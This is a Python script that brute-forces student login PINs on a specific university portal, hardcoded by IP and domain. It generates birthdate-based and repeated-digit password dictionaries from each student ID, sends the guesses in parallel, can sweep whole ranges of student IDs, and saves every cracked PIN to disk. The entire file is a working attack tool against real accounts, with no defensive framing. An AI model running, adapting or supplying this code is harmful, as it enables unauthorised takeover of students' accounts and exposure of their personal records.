#!/usr/bin/env python3.6.7

import multiprocessing
import gc
import time
import requests
import sys
import logging


def init_global_argument(args):
    global MAX_RETRY
    global PROCESS_COUNT
    global URL
    global OK_TXT

    MAX_RETRY = args.retry
    PROCESS_COUNT = args.process

    # URL = "http://sion.stikom-bali.ac.id/load_login.php"
    URL = "http://180.250.7.188/load_login.php"
    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""


def init_logging():
    logFormatter = logging.Formatter(
        fmt="[%(asctime)s][%(levelname)s] %(message)s",
        datefmt='%d-%b-%y %H:%M:%S')

    rootLogger = logging.getLogger()

    fileHandler = logging.FileHandler("log.txt", mode='w')
    fileHandler.setFormatter(logFormatter)
    rootLogger.addHandler(fileHandler)

    consoleHandler = logging.StreamHandler()
    consoleHandler.setFormatter(logFormatter)
    rootLogger.addHandler(consoleHandler)

    rootLogger.setLevel(logging.INFO)


def init_dictionary(nim="160000000"):
    nim = str(nim)
    start_year = int(nim[:2]) + 81
    end_year = int(nim[:2]) + 83

    start_time = time.time()
    DICTIONARY = []
    for yy in range(start_year, end_year+1):
        for mm in range(1, 13):
            for dd in range(1, 32):
                if mm == 2 and dd > 29:
                    continue
                if mm in [2, 4, 6, 9, 11] and dd > 30:
                    continue
                DICTIONARY.append(str(dd).zfill(2)
                                  + str(mm).zfill(2)
                                  + str(yy).zfill(2)[-2:])
                DICTIONARY.append(str(yy).zfill(2)[-2:]
                                  + str(mm).zfill(2)
                                  + str(dd).zfill(2))
    for n in range(0, 1000):
        t = str(n)
        DICTIONARY.append(t * int(6 / len(t)))

    # put extra values here
    DICTIONARY += [
        "123456",
        "654321",
    ]
    DICTIONARY = list(set(DICTIONARY))
    total_time = time.time()-start_time

    logging.info("Dictionary generated {} values in {:0.2f}s for {}"
          .format(len(DICTIONARY), total_time, nim))
    return DICTIONARY


def login(pin, depth=0):
    global URL
    global OK_TXT
    global SHARED
    global NIM
    global MAX_RETRY

    if not SHARED.found:
        try:
            with requests.Session() as s:
                data = {"usern": NIM, "passw": pin}
                r = s.post(URL, data=data).text
            if r == OK_TXT:
                SHARED.found = True
                return pin
        except (requests.ConnectTimeout, requests.ConnectionError):
            logging.warning('Connection Problem occured, {} of {} retries'.format(depth, MAX_RETRY))
            if depth < MAX_RETRY:
                depth += 1
                return login(pin, depth=depth)


def brute(nim):
    global PROCESS_COUNT
    global SHARED
    global NIM

    start_time = time.time()
    logging.info('Trying for {} '.format(nim))

    NIM = nim
    SHARED = multiprocessing.Manager().Namespace()
    SHARED.found = False

    # check saved pin first
    try:
        with open('found/{}'.format(nim), 'r') as f:
            pin = f.read()
            logging.info('Saved pin found for {}, trying it.'.format(nim))
    except FileNotFoundError:
        pass
    else:
        result = login(pin)
        if result == pin:
            logging.info('Saved pin is good.')
            return
        else:
            logging.warning('Saved pin is bad, trying normal method.')

    DICTIONARY = init_dictionary(nim)
    with multiprocessing.Pool(PROCESS_COUNT) as pool:
        result = list(pool.map(login, DICTIONARY))

    result = list(set(result))
    result.remove(None)
    total_time = time.time() - start_time

    if len(result) == 1:
        with open('found/{}'.format(nim), 'w') as logfile:
            logfile.write(result[0])
            logging.info('Found %s %s' % (NIM, result[0]))
    else:
        logging.info('Failed %s' % (NIM))
    logging.info("Finished %s in %.2fs" % (NIM, total_time))


def parse_argument():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--retry",
                        metavar="N",
                        default=4,
                        type=int,
                        help="number of max retry if exception occured, default is 4")
    parser.add_argument("--infile",
                        metavar="PATH",
                        help="txt file containing targets to bruteforce")
    parser.add_argument("--outfile",
                        metavar="PATH",
                        default="temp.txt",
                        help="txt file to write if not all target is tried default is temp.txt")
    parser.add_argument("--target",
                        metavar="TARGET",
                        type=int,
                        help="target NIM to bruteforce",
                        nargs="+")
    parser.add_argument("--range",
                        metavar=("START", "END"),
                        type=int,
                        nargs=2,
                        help="range of target NIM to bruteforce, END is included in the range")
    parser.add_argument('-p', '--process',
                        metavar="N",
                        type=int,
                        default=multiprocessing.cpu_count(),
                        help="Specify number of process to use, default value is CPU Count. It's more limiting to RAM than CPU, use with CAUTION!!!")
    return parser.parse_args()


def main():
    global PROCESS_COUNT
    args = parse_argument()

    init_logging()
    init_global_argument(args)

    # parse and gather all target
    target = []
    done = []
    if args.infile:
        try:
            with open(args.infile, 'r') as filetarget:
                target += filetarget.read().split(' ')
        except FileNotFoundError:
            logging.warning('Logfile not found.')
    if args.target:
        target += args.target
    if args.range:
        target += [n for n in range(args.range[0], args.range[1]+1)]
    if target == []:
        logging.critical('Target is empty!')
        exit(1)

    logging.info("Starting bruteforce with {} processes for {} target(s)".format(
        PROCESS_COUNT, len(target)))

    try:
        for nim in target:
            brute(nim=nim)
            done.append(nim)
            gc.collect()
    except KeyboardInterrupt:
        logging.info('Interrupted by user input')
    except Exception as ex:
        logging.exception('Exception occured: {}'.format(str(ex)))
    finally:
        if not len(done) == len(target):
            logging.info(
                'Program terminated prematurely. Writing remaining target to temp.txt')
            with open(args.outfile, 'w') as outfile:
                outfile.write(' '.join([str(t)
                                        for t in target if t not in done]))


if __name__ == '__main__':
    main()
